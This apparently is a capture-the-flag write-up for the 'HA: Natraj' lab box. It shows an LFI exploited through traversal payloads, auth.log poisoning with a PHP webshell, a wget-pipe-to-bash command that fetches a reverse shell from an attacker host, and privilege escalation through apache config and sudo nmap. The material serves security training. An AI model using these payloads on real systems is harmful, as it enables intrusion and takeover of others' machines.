# Ha Natraj

## Enum

```bash
nmap -Pn -sV -sC 192.168.185.80 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 18:22 IST
Nmap scan report for 192.168.185.80
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)
|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)
|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA:Natraj
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

Found the `console` directory
```
ffuf \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u "http://192.168.185.80/FUZZ" \
  -mc all -fs 276

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.185.80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 276
________________________________________________

[Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]
    * FUZZ: images

[Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 30ms]
    * FUZZ: console

:: Progress: [2798/30000] :: Job [1/1] :: 1282 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

There's a `file.php` in there 
```bash
curl -i http://192.168.185.80/console/file.php
HTTP/1.1 200 OK
Date: Fri, 18 Aug 2023 17:30:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

## LFI

Which predictably has an LFI in the file param
```bash
curl -i http://192.168.185.80/console/file.php?file=../../../../../etc/passwd
HTTP/1.1 200 OK
Date: Fri, 18 Aug 2023 17:30:55 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1398
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```
```bash
curl -s http://192.168.185.80/console/file.php?file=../../../../../etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```
```bash
curl -s http://192.168.185.80/console/file.php?file=../../../../../etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
```bash
curl -s http://192.168.185.80/console/file.php?file=../../../../../etc/hosts
127.0.0.1       localhost
127.0.1.1       ubuntu

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Automating the exploration process
```bash
wfuzz -c -w ./lfi2.txt --hw 0 http://192.168.185.80/console/file.php?file=FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.185.80/console/file.php?file=FUZZ
Total requests: 2292

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000018:   200        27 L     35 W       1398 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
000000016:   200        27 L     35 W       1398 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"
000000092:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../etc/passwd"
000000084:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"
000000078:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"
000000076:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"
000000074:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"
000000072:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"
000000069:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
000000116:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../../etc/passwd"
000000199:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../../etc/passwd"
000000198:   200        54 L     54 W       743 Ch      "../../../../../../../../../../../../../../etc/group"
000000241:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../etc/passwd"
000000240:   200        54 L     54 W       743 Ch      "../../../../../../../../../../../etc/group"
000000226:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../etc/passwd"
000000224:   200        7 L      22 W       186 Ch      "../../../../../../../../../../../../etc/hosts"
000000223:   200        54 L     54 W       743 Ch      "../../../../../../../../../../../../etc/group"
000000210:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../../../../etc/passwd"
000000209:   200        54 L     54 W       743 Ch      "../../../../../../../../../../../../../etc/group"
000000253:   200        54 L     54 W       743 Ch      "../../../../../../../../../../etc/group"
000000281:   200        27 L     35 W       1398 Ch     "../../../../../../../../etc/passwd"
000000300:   200        27 L     35 W       1398 Ch     "../../../../../../../etc/passwd"
000000295:   200        54 L     54 W       743 Ch      "../../../../../../../etc/group"
000000280:   200        54 L     54 W       743 Ch      "../../../../../../../../etc/group"
000000267:   200        27 L     35 W       1398 Ch     "../../../../../../../../../etc/passwd"
000000266:   200        54 L     54 W       743 Ch      "../../../../../../../../../etc/group"
000000254:   200        27 L     35 W       1398 Ch     "../../../../../../../../../../etc/passwd"
000000337:   200        27 L     35 W       1398 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"
000000335:   200        27 L     35 W       1398 Ch     "../../../../../../etc/passwd"
000000334:   200        54 L     54 W       743 Ch      "../../../../../../etc/group"
000000357:   200        27 L     35 W       1398 Ch     "../../../../../etc/passwd"
000000390:   200        54 L     54 W       743 Ch      "../../../../etc/group"
000000391:   200        27 L     35 W       1398 Ch     "../../../../etc/passwd"
000000352:   200        54 L     54 W       743 Ch      "../../../../../etc/group"
000000596:   200        27 L     35 W       1398 Ch     "/./././././././././././etc/passwd"
000000583:   200        27 L     35 W       1398 Ch     "/../../../../../../../../../../etc/passwd"
000000570:   200        27 L     35 W       1398 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
000000614:   200        27 L     35 W       1398 Ch     "///////../../../etc/passwd"
000000701:   200        194 L    599 W      5574 Ch     "/boot/grub/grub.cfg"
000000754:   200        31 L     197 W      1332 Ch     "/etc/apache2/sites-enabled/000-default.conf"
000000750:   200        15 L     46 W       320 Ch      "/etc/apache2/ports.conf"
000000749:   200        29 L     102 W      749 Ch      "/etc/apache2/mods-enabled/status.conf"
000000747:   200        20 L     124 W      724 Ch      "/etc/apache2/mods-enabled/negotiation.conf"
000000746:   200        251 L    1128 W     7676 Ch     "/etc/apache2/mods-enabled/mime.conf"
000000744:   200        10 L     31 W       395 Ch      "/etc/apache2/mods-enabled/deflate.conf"
000000743:   200        24 L     131 W      843 Ch      "/etc/apache2/mods-enabled/alias.conf"
000000742:   200        85 L     442 W      3110 Ch     "/etc/apache2/mods-available/ssl.conf"
000000745:   200        5 L      18 W       157 Ch      "/etc/apache2/mods-enabled/dir.conf"
000000741:   200        32 L     139 W      1280 Ch     "/etc/apache2/mods-available/setenvif.conf"
000000740:   200        27 L     139 W      822 Ch      "/etc/apache2/mods-available/proxy.conf"
000000737:   200        5 L      18 W       157 Ch      "/etc/apache2/mods-available/dir.conf"
000000739:   200        251 L    1128 W     7676 Ch     "/etc/apache2/mods-available/mime.conf"
000000736:   200        10 L     31 W       395 Ch      "/etc/apache2/mods-available/deflate.conf"
000000735:   200        96 L     392 W      3374 Ch     "/etc/apache2/mods-available/autoindex.conf"
000000731:   200        47 L     227 W      1782 Ch     "/etc/apache2/envvars"
000000724:   200        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"
000000712:   200        88 L     467 W      3028 Ch     "/etc/adduser.conf"
000000788:   200        15 L     124 W      722 Ch      "/etc/crontab"
000000804:   200        54 L     207 W      1735 Ch     "/etc/dhcp/dhclient.conf"
000000803:   200        20 L     99 W       604 Ch      "/etc/deluser.conf"
000000799:   200        33 L     165 W      1235 Ch     "/etc/default/grub"
000000798:   200        1 L      1 W        11 Ch       "/etc/debian_version"
000000797:   200        83 L     485 W      2969 Ch     "/etc/debconf.conf"
000000777:   200        144 L    207 W      5889 Ch     "/etc/ca-certificates.conf"
000000769:   200        71 L     329 W      2319 Ch     "/etc/bash.bashrc"
000000765:   200        55 L     351 W      3018 Ch     "/etc/apt/sources.list"
000000822:   200        8 L      43 W       280 Ch      "/etc/fuse.conf"
000000830:   200        1 L      1 W        7 Ch        "/etc/hostname"
000000829:   200        3 L      18 W       92 Ch       "/etc/host.conf"
000000828:   200        138 L    819 W      4861 Ch     "/etc/hdparm.conf"
000000825:   200        55 L     55 W       760 Ch      "/etc/group-"
000000823:   200        54 L     54 W       743 Ch      "/etc/group"
000000815:   200        11 L     81 W       625 Ch      "/etc/fstab"
000000898:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"
000000899:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"
000000897:   200        7 L      22 W       186 Ch      "/etc/hosts"
000000954:   200        36 L     114 W      703 Ch      "/etc/logrotate.conf"
000000953:   200        341 L    1753 W     10550 Ch    "/etc/login.defs"
000000949:   200        17 L     40 W       332 Ch      "/etc/ldap/ldap.conf"
000000948:   200        2 L      2 W        34 Ch       "/etc/ld.so.conf"
000000944:   200        1 L      3 W        17 Ch       "/etc/issue.net"
000000946:   200        6 L      22 W       144 Ch      "/etc/kernel-img.conf"
000000943:   200        2 L      5 W        24 Ch       "/etc/issue"
000000939:   200        355 L    1050 W     8181 Ch     "/etc/init.d/apache2"
000001006:   200        20 L     63 W       513 Ch      "/etc/nsswitch.conf"
000000999:   200        2 L      12 W       91 Ch       "/etc/networks"
000000998:   200        8 L      39 W       247 Ch      "/etc/network/interfaces"
000000983:   200        33 L     198 W      2447 Ch     "/etc/mtab"
000000976:   200        5 L      36 W       195 Ch      "/etc/modules"
000000969:   200        131 L    715 W      5174 Ch     "/etc/manpath.config"
000000962:   200        4 L      6 W        103 Ch      "/etc/lsb-release"
000001010:   200        12 L     17 W       382 Ch      "/etc/os-release"
000001014:   200        27 L     35 W       1398 Ch     "/etc/passwd"
000000963:   200        543 L    1307 W     14867 Ch    "/etc/ltrace.conf"
000001016:   200        28 L     38 W       1487 Ch     "/etc/passwd-"
000001012:   200        15 L     59 W       552 Ch      "/etc/pam.conf"
000001106:   200        122 L    802 W      4620 Ch     "/etc/security/access.conf"
000001097:   200        40 L     117 W      887 Ch      "/etc/rpc"
000001095:   200        17 L     111 W      701 Ch      "/etc/resolv.conf"
000001069:   200        27 L     97 W       581 Ch      "/etc/profile"
000001122:   200        11 L     70 W       419 Ch      "/etc/security/sepermit.conf"
000001151:   200        122 L    396 W      3264 Ch     "/etc/ssh/sshd_config"
000001146:   200        51 L     218 W      1580 Ch     "/etc/ssh/ssh_config"
000001123:   200        65 L     412 W      2179 Ch     "/etc/security/time.conf"
000001119:   200        73 L     499 W      2972 Ch     "/etc/security/pam_env.conf"
000001116:   200        56 L     347 W      2150 Ch     "/etc/security/limits.conf"
000001117:   200        28 L     217 W      1440 Ch     "/etc/security/namespace.conf"
000001112:   200        106 L    663 W      3635 Ch     "/etc/security/group.conf"
000001160:   200        77 L     339 W      2683 Ch     "/etc/sysctl.conf"
000001173:   200        4 L      45 W       403 Ch      "/etc/updatedb.conf"
000001169:   200        1 L      1 W        20 Ch       "/etc/timezone"
000001161:   200        3 L      14 W       77 Ch       "/etc/sysctl.d/10-console-messages.conf"
000001162:   200        12 L     69 W       509 Ch      "/etc/sysctl.d/10-network-security.conf"
000001308:   200        1 L      6 W        134 Ch      "/proc/cmdline"
000001314:   200        1 L      5 W        27 Ch       "/proc/loadavg"
000001310:   200        57 L     112 W      533 Ch      "/proc/devices"
000001322:   200        3 L      46 W       450 Ch      "/proc/net/tcp"
000001326:   200        0 L      1 W        27 Ch       "/proc/self/cmdline"
000001324:   200        5 L      16 W       116 Ch      "/proc/partitions"
000001321:   200        3 L      33 W       384 Ch      "/proc/net/route"
000001323:   200        2 L      28 W       256 Ch      "/proc/net/udp"
000001320:   200        42 L     124 W      1113 Ch     "/proc/net/fib_trie"
000001325:   200        233 L    1563 W     17181 Ch    "/proc/sched_debug"
000001318:   200        2 L      15 W       158 Ch      "/proc/net/arp"
000001319:   200        4 L      54 W       448 Ch      "/proc/net/dev"
000001317:   200        33 L     198 W      2447 Ch     "/proc/mounts"
000001316:   200        41 L     246 W      2119 Ch     "/proc/modules"
000001313:   200        60 L     220 W      1586 Ch     "/proc/ioports"
000001315:   200        48 L     140 W      1335 Ch     "/proc/meminfo"
000001312:   200        68 L     393 W      3513 Ch     "/proc/interrupts"
000001309:   200        28 L     196 W      1142 Ch     "/proc/cpuinfo"
000001311:   200        32 L     58 W       383 Ch      "/proc/filesystems"
000001443:   200        1 L      17 W       146 Ch      "/proc/version"
000001442:   200        2 L      10 W       95 Ch       "/proc/swaps"
000001440:   200        53 L     129 W      1260 Ch     "/proc/self/status"
000001441:   200        9 L      302 W      774 Ch      "/proc/stat"
000001439:   200        1 L      52 W       319 Ch      "/proc/self/stat"
000001438:   200        2 L      15 W       158 Ch      "/proc/self/net/arp"
000001437:   200        33 L     198 W      2447 Ch     "/proc/self/mounts"
000001725:   200        4 L      36 W       1513 Ch     "/usr/share/pixmaps/debian-logo.png"
000001722:   200        88 L     467 W      3028 Ch     "/usr/share/adduser/adduser.conf"
000001824:   200        683 L    8253 W     64983 Ch    "/var/log/auth.log"
000001827:   200        2686 L   32224 W    250978 Ch   "/var/log/auth.log.1"
000002044:   200        0 L      1 W        1152 Ch     "/var/run/utmp"
```

Couldn't find a log file to poison on the usual webserver logs locations
```bash
for i in $(cat file);do echo ${i};curl -s http://192.168.185.80/console/file.php?file=${i} ;done
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

But the ssh one can be leveraged
```bash
ssh yaya@192.168.185.80                    
The authenticity of host '192.168.185.80 (192.168.185.80)' can't be established.
ED25519 key fingerprint is SHA256:oikisLZJ8r96QhcB1H0OEK18JfSIUhkZ4+MmhbRuA6Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.185.80' (ED25519) to the list of known hosts.
yaya@192.168.185.80's password:
Permission denied, please try again.
yaya@192.168.185.80's password:
Permission denied, please try again.
yaya@192.168.185.80's password:
```

```bash
curl http://192.168.185.80/console/file.php?file=/var/log/auth.log|tail
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 71650    0 71650    0     0   506k      0 --:--:-- --:--:-- --:--:--  507k
Aug 18 11:28:01 ubuntu CRON[24623]: pam_unix(cron:session): session closed for user root
Aug 18 11:29:01 ubuntu CRON[24626]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug 18 11:29:01 ubuntu CRON[24626]: pam_unix(cron:session): session closed for user root
Aug 18 11:30:01 ubuntu CRON[24629]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug 18 11:30:01 ubuntu CRON[24629]: pam_unix(cron:session): session closed for user root
Aug 18 11:30:22 ubuntu sshd[24632]: Invalid user yaya from 192.168.45.227 port 56084
Aug 18 11:30:24 ubuntu sshd[24632]: pam_unix(sshd:auth): check pass; user unknown
Aug 18 11:30:24 ubuntu sshd[24632]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.45.227
Aug 18 11:30:26 ubuntu sshd[24632]: Failed password for invalid user yaya from 192.168.45.227 port 56084 ssh2
Aug 18 11:30:26 ubuntu sshd[24632]: Connection closed by invalid user yaya 192.168.45.227 port 56084 [preauth]
```

## LFI to RCE through log file poisoning 

Uploading a php webshell into the ssh auth log
```
ssh '<?php echo system($_GET["cmd"]); ?>'@192.168.185.80
<?php system($_GET["cmd"]); ?>@192.168.185.80's password:
^C
```

Using the webshell to trigger a staged reverse shell, this was a bit of a trial and error process as the box does not have curl, this ended up working with wget
```bash
wget -O- http://192.168.45.218:9090/shell.sh|bash
```

```bash
curl 'http://192.168.168.80/console/file.php?file=../../../../../var/log/auth.log?cmd=wget%20-O-%20http://192.168.45.218:9090/shell.sh%7Cbash'
```

www-data having sudoer's rules looks a bit weird to me but ok. We can restart the apache daemon.
```bash
sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/systemctl start apache2
    (ALL) NOPASSWD: /bin/systemctl stop apache2
    (ALL) NOPASSWD: /bin/systemctl restart apache2
```


## Restart the server as Mahakal

We also have access to modify the apache config
```bash
ls -la /etc/apache2/apache2.conf
-rwxrwxrwx 1 root root 7254 Aug 20 10:36 /etc/apache2/apache2.conf
```

So let's get a proper shell
```bash
┌──(blnkn㉿Kolossus)-[~]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.45.218] from (UNKNOWN) [192.168.168.80] 54240
bash: cannot set terminal process group (545): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/console$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ole$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/console$ ^Z
[1]+  Stopped                 nc -lvnp 4242

┌──(blnkn㉿Kolossus)-[~]
└─$ stty raw -echo

┌──(blnkn㉿Kolossus)-[~]
└─$
nc -lvnp 4242
             reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@ubuntu:/var/www/html/console$ export TERM=screen
www-data@ubuntu:/var/www/html/console$ export SHELL=bash
www-data@ubuntu:/var/www/html/console$
www-data@ubuntu:/var/www/html/console$
```

Now we can use vim to modify the config to run the server as mahakal and restart the daemon
```bash
# These need to be set in /etc/apache2/envvars
User mahakal
Group mahakal
```

Makahal can run nmap as root
```bash
mahakal@ubuntu:/home/mahakal$ sudo -l
Matching Defaults entries for mahakal on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap
```


## Nmap privesc

nmap is a gtfo bin and the sudo line has no restrictions
```bash
mahakal@ubuntu:/home/natraj$ TF=$(mktemp)
mahakal@ubuntu:/home/natraj$ echo 'os.execute("/bin/sh")' > $TF
mahakal@ubuntu:/home/natraj$ cat $TF
os.execute("/bin/sh")
mahakal@ubuntu:/home/natraj$ sudo nmap --script=$TF                                                      

Starting Nmap 7.60 ( https://nmap.org ) at 2023-08-18 12:29 PDT
NSE: Warning: Loading '/tmp/tmp.7IIkq3SoTy' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
```
